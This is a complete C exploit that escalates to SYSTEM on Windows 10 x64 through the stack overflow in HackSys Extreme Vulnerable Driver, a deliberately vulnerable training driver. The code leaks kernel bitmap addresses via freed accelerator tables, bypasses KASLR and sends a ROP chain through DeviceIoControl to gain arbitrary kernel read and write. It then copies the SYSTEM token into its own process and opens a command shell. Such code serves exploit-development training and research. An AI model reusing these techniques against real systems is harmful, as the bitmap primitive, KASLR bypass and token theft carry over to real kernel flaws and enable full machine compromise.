#include <windows.h>
#include <stdio.h>
#include <sddl.h>
#include "HS-StackOverflowGDI.h"


LONG BitmapArbitraryRead(HBITMAP hManager, HBITMAP hWorker, LPVOID lpReadAddress, LPVOID lpReadResult, DWORD dwReadLen)
{
	SetBitmapBits(hManager, dwReadLen, &lpReadAddress);	// Set Workers pvScan0 to the Address we want to read. 
	return GetBitmapBits(hWorker, dwReadLen, lpReadResult); // Use Worker to Read result into lpReadResult Pointer.
}


LONG BitmapArbitraryWrite(HBITMAP hManager, HBITMAP hWorker, LPVOID lpWriteAddress, LPVOID lpWriteValue, DWORD dwWriteLen)
{
	SetBitmapBits(hManager, dwWriteLen, &lpWriteAddress);     // Set Workers pvScan0 to the Address we want to write.
	return SetBitmapBits(hWorker, dwWriteLen, &lpWriteValue); // Use Worker to Write at Arbitrary Kernel address.
}


LeakBitmapInfo GDIReloaded(LPCWSTR lpBitmapName, DWORD dwOffsetToPvScan0)
{
	LeakBitmapInfo BitmapInfo;
	DWORD dwCounter = 0;
	HACCEL hAccel;						// Handle to Accelerator table 
	LPACCEL lpAccel;					// Pointer to Accelerator table Array
	PUSER_HANDLE_ENTRY AddressA = NULL;
	PUSER_HANDLE_ENTRY AddressB = NULL;
	PUCHAR pAcceleratorAddrA = NULL;
	PUCHAR pAcceleratorAddrB = NULL;

	PSHAREDINFO pSharedInfo = (PSHAREDINFO)GetProcAddress(GetModuleHandle(L"user32.dll"), "gSharedInfo");
	PUSER_HANDLE_ENTRY gHandleTable = pSharedInfo->aheList;
	DWORD index;

	// Allocate Memory for the Accelerator Array
	lpAccel = (LPACCEL)LocalAlloc(LPTR, sizeof(ACCEL) * 700);

	wprintf(L" [*] Creating and Freeing AcceleratorTables");

	while (dwCounter < 20) {
		hAccel = CreateAcceleratorTable(lpAccel, 700);
		index = LOWORD(hAccel);
		AddressA = &gHandleTable[index];
		pAcceleratorAddrA = (PUCHAR)AddressA->pKernel;
		DestroyAcceleratorTable(hAccel);

		hAccel = CreateAcceleratorTable(lpAccel, 700);
		index = LOWORD(hAccel);
		AddressB = &gHandleTable[index];
		pAcceleratorAddrB = (PUCHAR)AddressB->pKernel;

		if (pAcceleratorAddrA == pAcceleratorAddrB) {
			DestroyAcceleratorTable(hAccel);
			LPVOID lpBuf = VirtualAlloc(NULL, 0x50 * 2 * 4, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
			BitmapInfo.hBitmap = CreateBitmap(0x701, 2, 1, 8, lpBuf);
			break;
		}
		DestroyAcceleratorTable(hAccel);
		dwCounter++;
	}

	wprintf(L" -> Done!\n");

	BitmapInfo.pBitmapPvScan0 = pAcceleratorAddrA + dwOffsetToPvScan0;
	wprintf(L" [+] Duplicate AcceleratorTable Address: 0x%p \n", pAcceleratorAddrA);
	wprintf(L" [+] %ls Bitmap Handle at: 0x%08x \n", lpBitmapName, (ULONG)BitmapInfo.hBitmap);
	wprintf(L" [+] %ls Bitmap pvScan0 Pointer: 0x%p \n\n", lpBitmapName, BitmapInfo.pBitmapPvScan0);

	return BitmapInfo;
}


KERNELINFO KernelInfo(LPCSTR lpSymbolName)
{
	KERNELINFO pLiveKernelInfo;
	DWORD len;
	PSYSTEM_MODULE_INFORMATION ModuleInfo;
	LPVOID kernelBase = NULL;
	HMODULE hUserSpaceKernel;
	LPCSTR lpKernelName = NULL;
	FARPROC pUserKernelSymbol = NULL;

	_NtQuerySystemInformation NtQuerySystemInformation = (_NtQuerySystemInformation)
		GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQuerySystemInformation");
	if (NtQuerySystemInformation == NULL) {
		wprintf(L" -> Oops something went wrong!\n\n");
		exit(1);
	}

	NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &len);
	ModuleInfo = (PSYSTEM_MODULE_INFORMATION)VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!ModuleInfo)
	{
		wprintf(L" -> Unable to read KernelInfo!\n\n");
		exit(1);
	}

	NtQuerySystemInformation(SystemModuleInformation, ModuleInfo, len, &len);

	kernelBase = ModuleInfo->Module[0].ImageBase;

	/* Find exported Kernel Functions */

	lpKernelName = ModuleInfo->Module[0].FullPathName + ModuleInfo->Module[0].OffsetToFileName;

	hUserSpaceKernel = LoadLibraryExA(lpKernelName, 0, 0);
	if (hUserSpaceKernel == NULL)
	{
		VirtualFree(ModuleInfo, 0, MEM_RELEASE);
		wprintf(L" -> Unable to read KernelInfo!\n\n");
		exit(1);
	}

	pUserKernelSymbol = GetProcAddress(hUserSpaceKernel, lpSymbolName);
	if (pUserKernelSymbol == NULL)
	{
		VirtualFree(ModuleInfo, 0, MEM_RELEASE);
		wprintf(L" -> Unable to read KernelInfo!\n\n");
		exit(1);
	}

	pLiveKernelInfo.pFunctionAddress = (PUCHAR)pUserKernelSymbol - (PUCHAR)hUserSpaceKernel + (PUCHAR)kernelBase;
	pLiveKernelInfo.pKernelBase = (PUCHAR)kernelBase;

	FreeLibrary(hUserSpaceKernel);
	VirtualFree(ModuleInfo, 0, MEM_RELEASE);

	return pLiveKernelInfo;
}


BOOL IsSystem(VOID)
{
	DWORD dwSize = 0, dwResult = 0;
	HANDLE hToken = NULL;
	PTOKEN_USER Ptoken_User;
	LPWSTR SID = NULL;

	// Open a handle to the access token for the calling process.
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
		return FALSE;
	}

	// Call GetTokenInformation to get the buffer size.
	if (!GetTokenInformation(hToken, TokenUser, NULL, dwSize, &dwSize)) {
		dwResult = GetLastError();
		if (dwResult != ERROR_INSUFFICIENT_BUFFER) {
			return FALSE;
		}
	}

	// Allocate the buffer.
	Ptoken_User = (PTOKEN_USER)GlobalAlloc(GPTR, dwSize);

	// Call GetTokenInformation again to get the group information.
	if (!GetTokenInformation(hToken, TokenUser, Ptoken_User, dwSize, &dwSize)) {
		return FALSE;
	}
	if (!ConvertSidToStringSidW(Ptoken_User->User.Sid, &SID)) {
		return FALSE;
	}

	if (_wcsicmp(L"S-1-5-18", SID) != 0) {
		return FALSE;
	}
	if (Ptoken_User) GlobalFree(Ptoken_User);

	return TRUE;
}


void PopShell()
{
	STARTUPINFO si = { sizeof(STARTUPINFO) };
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	CreateProcess(L"C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, 0, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);

}


int wmain(int argc, wchar_t* argv[])
{
	OSVERSIONINFOEXW osInfo;
	TCHAR chOSMajorMinor[8];
	LeakBitmapInfo ManagerBitmap;
	LeakBitmapInfo WorkerBitmap;
	DWORD dwOffsetToPvScan0 = 0x50;
	DWORD dwUniqueProcessIdOffset = 0x2e8;
	DWORD dwTokenOffset = 0x358;
	DWORD dwActiveProcessLinks = 0x2f0;
	HANDLE hDevice;
	LPCWSTR lpDeviceName = L"\\\\.\\HacksysExtremeVulnerableDriver";
	BOOL bResult = FALSE;
	LPCSTR lpFunctionName = "PsInitialSystemProcess";
	DWORD dwPID;
	KERNELINFO KASLRBypass;
	ROP BitmapPvScan0Prep;


	wprintf(L"    __ __         __    ____       	\n");
	wprintf(L"   / // /__ _____/ /__ / __/_ _____	\n");
	wprintf(L"  / _  / _ `/ __/  '_/_\\ \\/ // (_-<	\n");
	wprintf(L" /_//_/\\_,_/\\__/_/\\_\\/___/\\_, /___/	\n");
	wprintf(L"                         /___/     	\n");
	wprintf(L"					\n");
	wprintf(L"        Extreme Vulnerable Driver  \n");
	wprintf(L"  Stack Overflow Windows 10 x64 Using GDI	\n\n");

	// Get OS Version/Architecture 
	osInfo.dwOSVersionInfoSize = sizeof(osInfo);

	_RtlGetVersion RtlGetVersion = (_RtlGetVersion)
		GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlGetVersion");
	if (RtlGetVersion == NULL) {
		wprintf(L" -> Unable to get Module handle!\n\n");
		exit(1);
	}

	RtlGetVersion(&osInfo);

	swprintf_s(chOSMajorMinor, sizeof(chOSMajorMinor), L"%u.%u", osInfo.dwMajorVersion, osInfo.dwMinorVersion);

	if (_wcsicmp(chOSMajorMinor, L"10.0") == 0 && sizeof(LPVOID) == 8) {
		wprintf(L" [*] Exploit running on Windows Version: 10 or Server 2016 x64 build %u \n\n", osInfo.dwBuildNumber);
	}
	else {
		wprintf(L" [!] This exploit has only been tested on Windows 10 x64 build 1607 \n\n");
		exit(1);
	}

	// Creating and Freeing AcceleratorTables and lookup pvScan0 addresses
	ManagerBitmap = GDIReloaded(L"Manager", dwOffsetToPvScan0);
	WorkerBitmap = GDIReloaded(L"Worker", dwOffsetToPvScan0);

	wprintf(L" [*] Trying to get a handle to the following Driver: %ls", lpDeviceName);

	hDevice = CreateFile(lpDeviceName,			// Name of the write
		GENERIC_READ | GENERIC_WRITE,			// Open for reading/writing
		FILE_SHARE_WRITE,				// Allow Share
		NULL,						// Default security
		OPEN_EXISTING,					// Opens a file or device, only if it exists.
		FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,	// Normal file
		NULL);						// No attr. template

	if (hDevice == INVALID_HANDLE_VALUE)
	{
		wprintf(L" -> Unable to get Driver handle!\n\n");
		exit(1);
	}

	wprintf(L" -> Done!\n");
	wprintf(L" [+] Our Device Handle: 0x%p \n\n", hDevice);

	wprintf(L" [*] Bypass KASLR and prepare our Bitmap Arbitrary Write ROP Chain");

	KASLRBypass = KernelInfo(lpFunctionName);
	// pop Worker and Manager PvScan0 Address in rax/r8 register:
	BitmapPvScan0Prep.PopRaxRet = KASLRBypass.pKernelBase + 0x4483f5;		// pop rax ; ret
	BitmapPvScan0Prep.pWorkerBitmapPvScan0 = WorkerBitmap.pBitmapPvScan0;		// WorkerBitmap PvScan0 Address
	BitmapPvScan0Prep.PopR8Ret = KASLRBypass.pKernelBase + 0x4253f6;		// pop r8 ; ret
	BitmapPvScan0Prep.pManagerBitmapPvScan0 = ManagerBitmap.pBitmapPvScan0;		// ManagerBitmap PvScan0 Address
	// Write Worker PvScan0 Address to Manager PvScan0 Address:
	BitmapPvScan0Prep.MovQwR8RaxRet = KASLRBypass.pKernelBase + 0x26d0;		// mov qword [r8], rax ; ret
	// Recover:
	BitmapPvScan0Prep.XorRaxRaxRet = KASLRBypass.pKernelBase + 0x13a11a;		// xor rax, rax ; ret
	BitmapPvScan0Prep.PopRsiRet = KASLRBypass.pKernelBase + 0x46e0;			// pop rsi ; ret
	BitmapPvScan0Prep.pZero1 = NULL;						// 0x0
	BitmapPvScan0Prep.PopRdiRet = KASLRBypass.pKernelBase + 0x825b4;		// pop rdi ; ret
	BitmapPvScan0Prep.pZero2 = NULL;						// 0x0
	// Return to IrpDeviceIoCtlHandler+0xe2

	CHAR *chBuffer;
	chBuffer = (CHAR *)malloc(2152);
	SecureZeroMemory(chBuffer, 2152);
	memcpy(chBuffer + 2072, &BitmapPvScan0Prep, sizeof(ROP));

	wprintf(L" -> Done!\n");
	wprintf(L" [+] Kernel Base Address           -> 0x%p \n", KASLRBypass.pKernelBase);
	wprintf(L" [+] pop rax ; ret                 -> Gadget available at: 0x%p \n", BitmapPvScan0Prep.PopRaxRet);
	wprintf(L" [+] WorkerBitmap PvScan0 Address  -> 0x%p \n", BitmapPvScan0Prep.pWorkerBitmapPvScan0);
	wprintf(L" [+] pop r8 ; ret                  -> Gadget available at: 0x%p \n", BitmapPvScan0Prep.PopR8Ret);
	wprintf(L" [+] ManagerBitmap PvScan0 Address -> 0x%p \n", BitmapPvScan0Prep.pManagerBitmapPvScan0);
	wprintf(L" [+] mov qword [r8], rax ; ret     -> Gadget available at: 0x%p \n", BitmapPvScan0Prep.MovQwR8RaxRet);
	wprintf(L" [+] xor rax, rax ; ret            -> Gadget available at: 0x%p \n", BitmapPvScan0Prep.XorRaxRaxRet);
	wprintf(L" [+] pop rsi ; ret                 -> Gadget available at: 0x%p \n", BitmapPvScan0Prep.PopRsiRet);
	wprintf(L" [+] pop rdi ; ret                 -> Gadget available at: 0x%p \n\n", BitmapPvScan0Prep.PopRdiRet);

	wprintf(L" [*] Lets send some Bytes to our Driver and ROP our StackOverflow into a Arbitrary Write");

	DWORD junk = 0;                     	// Discard results

	bResult = DeviceIoControl(hDevice,	// Device to be queried
		0x222003,			// Operation to perform
		chBuffer, 2152,			// Input Buffer
		NULL, 0,			// Output Buffer
		&junk,				// # Bytes returned
		(LPOVERLAPPED)NULL);		// Synchronous I/O	
	if (!bResult) {
		wprintf(L" -> Failed to send Data!\n\n");
		CloseHandle(hDevice);
		exit(1);
	}

	CloseHandle(hDevice);

	wprintf(L" -> Done!\n\n");

	// Use BitmapArbitraryRead() to read System EPROCESS Structure values
	wprintf(L" [*] Reading System _EPROCESS structure");

	LPVOID lpSystemEPROCESS = NULL;
	LPVOID lpSysProcID = NULL;
	LIST_ENTRY leNextProcessLink;
	LPVOID lpSystemToken = NULL;

	BitmapArbitraryRead(ManagerBitmap.hBitmap, WorkerBitmap.hBitmap, (LPVOID)KASLRBypass.pFunctionAddress, &lpSystemEPROCESS, sizeof(LPVOID));
	BitmapArbitraryRead(ManagerBitmap.hBitmap, WorkerBitmap.hBitmap, (PUCHAR)lpSystemEPROCESS + dwUniqueProcessIdOffset, &lpSysProcID, sizeof(LPVOID));
	BitmapArbitraryRead(ManagerBitmap.hBitmap, WorkerBitmap.hBitmap, (PUCHAR)lpSystemEPROCESS + dwActiveProcessLinks, &leNextProcessLink, sizeof(LIST_ENTRY));
	BitmapArbitraryRead(ManagerBitmap.hBitmap, WorkerBitmap.hBitmap, (PUCHAR)lpSystemEPROCESS + dwTokenOffset, &lpSystemToken, sizeof(LPVOID));

	DWORD dwSysProcID = LOWORD(lpSysProcID);

	wprintf(L" -> Done!\n");
	wprintf(L" [+] %hs Address is at: 0x%p \n", lpFunctionName, KASLRBypass.pFunctionAddress);
	wprintf(L" [+] System _EPROCESS is at: 0x%p \n", lpSystemEPROCESS);
	wprintf(L" [+] System PID is: %u \n", dwSysProcID);
	wprintf(L" [+] System _LIST_ENTRY is at: 0x%p \n", leNextProcessLink.Flink);
	wprintf(L" [+] System Token is: 0x%p \n\n", lpSystemToken);

	// Use BitmapArbitraryRead() to find Current Process Token and replace it with the SystemToken
	wprintf(L" [*] Reading Current _EPROCESS structure");

	// First get our Current Process ID
	dwPID = GetCurrentProcessId();

	LPVOID lpNextEPROCESS = NULL;
	LPVOID lpCurrentPID = NULL;
	LPVOID lpCurrentToken = NULL;
	DWORD dwCurrentPID;
	do {
		lpNextEPROCESS = (PUCHAR)leNextProcessLink.Flink - dwActiveProcessLinks;
		BitmapArbitraryRead(ManagerBitmap.hBitmap, WorkerBitmap.hBitmap, (PUCHAR)lpNextEPROCESS + dwUniqueProcessIdOffset, &lpCurrentPID, sizeof(LPVOID));
		BitmapArbitraryRead(ManagerBitmap.hBitmap, WorkerBitmap.hBitmap, (PUCHAR)lpNextEPROCESS + dwTokenOffset, &lpCurrentToken, sizeof(LPVOID));

		// Read _LIST_ENTRY to next Active _EPROCESS Structure
		BitmapArbitraryRead(ManagerBitmap.hBitmap, WorkerBitmap.hBitmap, (PUCHAR)lpNextEPROCESS + dwActiveProcessLinks, &leNextProcessLink, sizeof(LIST_ENTRY));

		dwCurrentPID = LOWORD(lpCurrentPID);

	} while (dwCurrentPID != dwPID);

	wprintf(L" -> Done!\n");
	wprintf(L" [+] Current _EPROCESS Structure is at: 0x%p \n", lpNextEPROCESS);
	wprintf(L" [+] Current Process ID is: %u \n", dwCurrentPID);
	wprintf(L" [+] Current _EPROCESS Token address is at: 0x%p \n", (PUCHAR)lpNextEPROCESS + dwTokenOffset);
	wprintf(L" [+] Current Process Token is: 0x%p \n\n", lpCurrentToken);

	wprintf(L" [*] Replace Current Token");

	BitmapArbitraryWrite(ManagerBitmap.hBitmap, WorkerBitmap.hBitmap, (PUCHAR)lpNextEPROCESS + dwTokenOffset, lpSystemToken, sizeof(LPVOID));

	wprintf(L" -> Done!\n\n");

	BOOL isGodMode = IsSystem();
	if (!isGodMode) {
		wprintf(L" [!] Exploit Failed :( \n\n");
		CloseHandle(hDevice);
		exit(1);
	}

	PopShell();
	wprintf(L" [!] Enjoy your Shell and Thank You for Flying Ring0 Airways ;) \n\n");

	return (0);

}
